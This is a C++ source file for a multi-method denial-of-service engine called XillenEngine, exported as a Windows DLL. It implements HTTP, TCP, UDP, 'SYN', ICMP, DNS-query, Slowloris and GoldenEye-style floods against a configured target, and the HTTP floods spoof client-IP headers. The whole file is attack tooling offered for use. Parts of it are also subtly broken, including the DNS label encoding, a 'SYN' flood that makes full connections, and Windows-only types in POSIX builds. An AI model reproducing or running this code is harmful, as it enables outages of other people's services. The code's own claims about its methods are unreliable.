#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <netinet/ip.h>
    #include <netinet/tcp.h>
    #include <netinet/udp.h>
    #include <netinet/ip_icmp.h>
    #include <sys/select.h>
    #include <sys/time.h>
    #include <signal.h>
#endif

extern "C" {
    struct AttackConfig {
        char target[256];
        char target_ip[256];
        int port;
        int threads;
        int duration;
        int method;
        int use_proxy;
        char proxies[1024];
        int verbose;
        char log_file[256];
    };

    struct AttackStats {
        uint64_t requests_sent;
        uint64_t errors;
        uint64_t successful_connections;
        uint64_t bytes_sent;
        uint64_t packets_sent;
        double rps;
        double uptime;
    };

    class XillenEngine {
    private:
        AttackConfig config;
        AttackStats stats;
        std::atomic<bool> running;
        std::vector<std::thread> workers;
        std::chrono::steady_clock::time_point start_time;
        
        std::vector<std::string> user_agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        };

        std::vector<std::string> paths = {
            "/", "/index.html", "/api", "/admin", "/login", "/dashboard", "/panel", "/control"
        };

        void init_winsock() {
#ifdef _WIN32
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif
        }

        void cleanup_winsock() {
#ifdef _WIN32
            WSACleanup();
#endif
        }

        std::string random_user_agent() {
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, user_agents.size() - 1);
            return user_agents[dis(gen)];
        }

        std::string random_path() {
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(0, paths.size() - 1);
            return paths[dis(gen)];
        }

        std::string random_ip() {
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dis(1, 255);
            return std::to_string(dis(gen)) + "." + std::to_string(dis(gen)) + "." + 
                   std::to_string(dis(gen)) + "." + std::to_string(dis(gen));
        }

        void http_flood_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        continue;
                    }

                    // Устанавливаем таймауты для предотвращения зависания
                    DWORD timeout = 3000; // 3 секунды
                    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
                    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(config.port);
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                        stats.errors++;
#ifdef _WIN32
                        closesocket(sockfd);
#else
                        close(sockfd);
#endif
                        std::this_thread::sleep_for(std::chrono::milliseconds(5));
                        continue;
                    }

                    std::string path = random_path();
                    std::string user_agent = random_user_agent();
                    std::string fake_ip = random_ip();

                    std::string request = 
                        "GET " + path + " HTTP/1.1\r\n"
                        "Host: " + std::string(config.target) + "\r\n"
                        "User-Agent: " + user_agent + "\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "Connection: close\r\n"
                        "Cache-Control: no-cache\r\n"
                        "Pragma: no-cache\r\n"
                        "X-Forwarded-For: " + fake_ip + "\r\n"
                        "X-Real-IP: " + fake_ip + "\r\n"
                        "X-Client-IP: " + fake_ip + "\r\n"
                        "X-Originating-IP: " + fake_ip + "\r\n"
                        "X-Remote-IP: " + fake_ip + "\r\n"
                        "X-Remote-Addr: " + fake_ip + "\r\n\r\n";

                    send(sockfd, request.c_str(), (int)request.length(), 0);
                    stats.requests_sent++;
                    stats.bytes_sent += request.length();
                    stats.successful_connections++;
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif

                    // Задержка между запросами для предотвращения перегрузки сети
                    std::this_thread::sleep_for(std::chrono::milliseconds(2));
                    
                } catch (...) {
                    stats.errors++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
        }

        void tcp_flood_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        continue;
                    }

                    // Устанавливаем таймауты
                    DWORD timeout = 3000;
                    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
                    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(config.port);
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                        stats.errors++;
#ifdef _WIN32
                        closesocket(sockfd);
#else
                        close(sockfd);
#endif
                        std::this_thread::sleep_for(std::chrono::milliseconds(5));
                        continue;
                    }

                    std::vector<char> data(512, 'A'); // Уменьшил размер пакета
                    send(sockfd, data.data(), (int)data.size(), 0);
                    stats.requests_sent++;
                    stats.bytes_sent += data.size();
                    stats.successful_connections++;
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif

                    // Задержка между запросами
                    std::this_thread::sleep_for(std::chrono::milliseconds(3));
                    
                } catch (...) {
                    stats.errors++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
        }

        void udp_flood_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        std::this_thread::sleep_for(std::chrono::milliseconds(10));
                        continue;
                    }

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(config.port);
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    std::vector<uint8_t> data(256); // Уменьшил размер пакета
                    for (size_t i = 0; i < data.size(); i++) {
                        data[i] = rand() % 256;
                    }

                    sendto(sockfd, (const char*)data.data(), (int)data.size(), 0, 
                           (struct sockaddr*)&server_addr, sizeof(server_addr));
                    
                    stats.requests_sent++;
                    stats.bytes_sent += data.size();
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif

                    // Задержка между пакетами
                    std::this_thread::sleep_for(std::chrono::milliseconds(5));
                    
                } catch (...) {
                    stats.errors++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }
        }

        void syn_flood_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        continue;
                    }

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(config.port);
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                        stats.errors++;
#ifdef _WIN32
                        closesocket(sockfd);
#else
                        close(sockfd);
#endif
                        continue;
                    }

                    std::vector<char> data(64, 'S');
                    send(sockfd, data.data(), (int)data.size(), 0);
                    stats.requests_sent++;
                    stats.bytes_sent += data.size();
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif
                } catch (...) {
                    stats.errors++;
                }
            }
        }

        void icmp_flood_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
#else
                    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        continue;
                    }

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = 0;
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    std::vector<uint8_t> packet(32);
                    packet[0] = 8;
                    packet[1] = 0;
                    for (int i = 2; i < 32; i++) {
                        packet[i] = rand() % 256;
                    }

                    sendto(sockfd, (const char*)packet.data(), (int)packet.size(), 0,
                           (struct sockaddr*)&server_addr, sizeof(server_addr));
                    
                    stats.requests_sent++;
                    stats.bytes_sent += packet.size();
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif
                } catch (...) {
                    stats.errors++;
                }
            }
        }

        void dns_amplification_worker() {
            std::vector<std::string> dns_servers = {
                "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
                "208.67.222.222", "208.67.220.220", "9.9.9.9"
            };
            
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_DGRAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        continue;
                    }

                    std::string dns_server = dns_servers[rand() % dns_servers.size()];
                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(53);
                    inet_pton(AF_INET, dns_server.c_str(), &server_addr.sin_addr);

                    std::vector<uint8_t> query = create_dns_query();
                    sendto(sockfd, (const char*)query.data(), (int)query.size(), 0,
                           (struct sockaddr*)&server_addr, sizeof(server_addr));
                    
                    stats.requests_sent++;
                    stats.bytes_sent += query.size();
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif
                } catch (...) {
                    stats.errors++;
                }
            }
        }

        std::vector<uint8_t> create_dns_query() {
            std::vector<uint8_t> query;
            
            uint16_t query_id = rand() % 65535;
            query.push_back((query_id >> 8) & 0xFF);
            query.push_back(query_id & 0xFF);
            
            query.push_back(0x01);
            query.push_back(0x00);
            query.push_back(0x00);
            query.push_back(0x01);
            query.push_back(0x00);
            query.push_back(0x00);
            query.push_back(0x00);
            query.push_back(0x00);
            query.push_back(0x00);
            query.push_back(0x00);
            
            std::string domain = "google.com";
            for (char c : domain) {
                if (c == '.') {
                    query.push_back(domain.length() - query.size() + 1);
                } else {
                    query.push_back(c);
                }
            }
            query.push_back(0);
            
            query.push_back(0x00);
            query.push_back(0x01);
            query.push_back(0x00);
            query.push_back(0x01);
            
            return query;
        }

        void slowloris_worker() {
            std::vector<SOCKET> connections;
            const int max_connections = 200;
            
            while (running.load()) {
                try {
                    if (connections.size() < max_connections) {
#ifdef _WIN32
                        SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
#else
                        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
#endif
                        if (sockfd != INVALID_SOCKET) {
                            struct sockaddr_in server_addr;
                            memset(&server_addr, 0, sizeof(server_addr));
                            server_addr.sin_family = AF_INET;
                            server_addr.sin_port = htons(config.port);
                            inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                            if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) >= 0) {
                                std::string request = 
                                    "GET / HTTP/1.1\r\n"
                                    "Host: " + std::string(config.target) + "\r\n"
                                    "User-Agent: " + random_user_agent() + "\r\n";
                                
                                send(sockfd, request.c_str(), (int)request.length(), 0);
                                connections.push_back(sockfd);
                                stats.requests_sent++;
                                stats.successful_connections++;
                            } else {
#ifdef _WIN32
                                closesocket(sockfd);
#else
                                close(sockfd);
#endif
                            }
                        }
                    }
                    
                    for (auto it = connections.begin(); it != connections.end();) {
                        try {
                            std::string header = "X-a: " + std::to_string(rand() % 5000) + "\r\n";
                            send(*it, header.c_str(), (int)header.length(), 0);
                            ++it;
                        } catch (...) {
#ifdef _WIN32
                            closesocket(*it);
#else
                            close(*it);
#endif
                            it = connections.erase(it);
                        }
                    }
                    
                    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 10000 + 5000));
                } catch (...) {
                    stats.errors++;
                }
            }
            
            for (SOCKET sock : connections) {
#ifdef _WIN32
                closesocket(sock);
#else
                close(sock);
#endif
            }
        }

        void goldeneye_worker() {
            while (running.load()) {
                try {
#ifdef _WIN32
                    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, 0);
#else
                    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
#endif
                    if (sockfd == INVALID_SOCKET) {
                        stats.errors++;
                        continue;
                    }

                    struct sockaddr_in server_addr;
                    memset(&server_addr, 0, sizeof(server_addr));
                    server_addr.sin_family = AF_INET;
                    server_addr.sin_port = htons(config.port);
                    inet_pton(AF_INET, config.target_ip, &server_addr.sin_addr);

                    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                        stats.errors++;
#ifdef _WIN32
                        closesocket(sockfd);
#else
                        close(sockfd);
#endif
                        continue;
                    }

                    std::string path = random_path();
                    std::string user_agent = random_user_agent();
                    std::string fake_ip = random_ip();

                    std::string request = 
                        "GET " + path + " HTTP/1.1\r\n"
                        "Host: " + std::string(config.target) + "\r\n"
                        "User-Agent: " + user_agent + "\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "Connection: keep-alive\r\n"
                        "Cache-Control: no-cache\r\n"
                        "Pragma: no-cache\r\n"
                        "X-Forwarded-For: " + fake_ip + "\r\n"
                        "X-Real-IP: " + fake_ip + "\r\n"
                        "X-Client-IP: " + fake_ip + "\r\n"
                        "X-Originating-IP: " + fake_ip + "\r\n"
                        "X-Remote-IP: " + fake_ip + "\r\n"
                        "X-Remote-Addr: " + fake_ip + "\r\n"
                        "X-Client-IP: " + fake_ip + "\r\n"
                        "X-Originating-IP: " + fake_ip + "\r\n"
                        "X-Remote-IP: " + fake_ip + "\r\n"
                        "X-Remote-Addr: " + fake_ip + "\r\n\r\n";

                    send(sockfd, request.c_str(), (int)request.length(), 0);
                    stats.requests_sent++;
                    stats.bytes_sent += request.length();
                    stats.successful_connections++;
                    stats.packets_sent++;

#ifdef _WIN32
                    closesocket(sockfd);
#else
                    close(sockfd);
#endif
                } catch (...) {
                    stats.errors++;
                }
            }
        }

        void mixed_attack_worker() {
            while (running.load()) {
                try {
                    int method = rand() % 4;
                    switch (method) {
                        case 0: http_flood_worker(); break;
                        case 1: tcp_flood_worker(); break;
                        case 2: udp_flood_worker(); break;
                        case 3: syn_flood_worker(); break;
                    }
                } catch (...) {
                    stats.errors++;
                }
            }
        }

    public:
        XillenEngine() : running(false) {
            memset(&stats, 0, sizeof(stats));
            init_winsock();
        }

        ~XillenEngine() {
            cleanup_winsock();
        }

        void set_config(const AttackConfig& cfg) {
            config = cfg;
        }

        void start_attack() {
            running.store(true);
            start_time = std::chrono::steady_clock::now();
            
            workers.clear();
            
            for (int i = 0; i < config.threads; i++) {
                switch (config.method) {
                    case 1: workers.emplace_back(&XillenEngine::http_flood_worker, this); break;
                    case 2: workers.emplace_back(&XillenEngine::tcp_flood_worker, this); break;
                    case 3: workers.emplace_back(&XillenEngine::udp_flood_worker, this); break;
                    case 4: workers.emplace_back(&XillenEngine::syn_flood_worker, this); break;
                    case 5: workers.emplace_back(&XillenEngine::icmp_flood_worker, this); break;
                    case 6: workers.emplace_back(&XillenEngine::dns_amplification_worker, this); break;
                    case 7: workers.emplace_back(&XillenEngine::slowloris_worker, this); break;
                    case 8: workers.emplace_back(&XillenEngine::goldeneye_worker, this); break;
                    case 9: workers.emplace_back(&XillenEngine::mixed_attack_worker, this); break;
                    default: workers.emplace_back(&XillenEngine::http_flood_worker, this); break;
                }
            }
        }

        void stop_attack() {
            running.store(false);
            
            for (auto& worker : workers) {
                if (worker.joinable()) {
                    worker.join();
                }
            }
            workers.clear();
        }

        AttackStats get_stats() {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            
            stats.uptime = (double)elapsed;
            stats.rps = elapsed > 0 ? (double)stats.requests_sent / elapsed : 0.0;
            
            return stats;
        }

        bool is_running() {
            return running.load();
        }
    };

    extern "C" {
        __declspec(dllexport) void* create_engine() {
            return new XillenEngine();
        }

        __declspec(dllexport) void destroy_engine(void* engine) {
            delete static_cast<XillenEngine*>(engine);
        }

        __declspec(dllexport) void set_config(void* engine, const AttackConfig* config) {
            static_cast<XillenEngine*>(engine)->set_config(*config);
        }

        __declspec(dllexport) void start_attack(void* engine) {
            static_cast<XillenEngine*>(engine)->start_attack();
        }

        __declspec(dllexport) void stop_attack(void* engine) {
            static_cast<XillenEngine*>(engine)->stop_attack();
        }

        __declspec(dllexport) AttackStats get_stats(void* engine) {
            return static_cast<XillenEngine*>(engine)->get_stats();
        }

        __declspec(dllexport) int is_running(void* engine) {
            return static_cast<XillenEngine*>(engine)->is_running() ? 1 : 0;
        }
    }
}